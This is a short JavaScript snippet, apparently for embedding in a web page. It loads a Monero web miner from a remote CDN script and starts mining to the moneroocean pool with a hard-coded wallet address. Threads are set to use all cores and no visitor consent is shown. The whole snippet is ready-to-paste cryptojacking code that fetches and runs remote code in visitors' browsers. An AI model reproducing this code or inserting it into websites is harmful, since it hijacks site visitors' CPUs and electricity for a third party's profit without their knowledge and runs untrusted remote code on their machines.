// Start Of Mining Code (Javascript)
// import command,
// import 'https://cdn.jsdelivr.net/gh/NajmAjmal/monero-webminer@main/external/javascript.js';

var script = document.createElement("script");
script.src = "https://cdn.jsdelivr.net/gh/NajmAjmal/monero-webminer@main/script.js";
document.head.appendChild(script);

server = "wss://ny1.xmrminingproxy.com";
var pool = "moneroocean.stream";
var walletAddress = "4Aevv5TzxT7c1sv3uukFbWY8bKUg2juWKNP2mtWH7YdzEs1SFrhDkiLDYfbVaavCZvMBf2xYMcdDSRZXBovfqtiFQrBnbeq";
var workerId = "GH-XMR-JS-SNIPPET"
var threads = -1;
var password = "";
startMining(pool, walletAddress, workerId, threads, password);
throttleMiner = 20;
// End Of Mining Code
